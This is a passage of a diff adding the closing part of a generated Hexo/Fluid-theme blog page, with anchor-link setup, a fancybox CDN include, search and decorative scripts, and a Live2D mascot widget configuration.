+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/star.js"></script>
+<script src="/js/love.js"></script>
+<script src="/js/duration.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
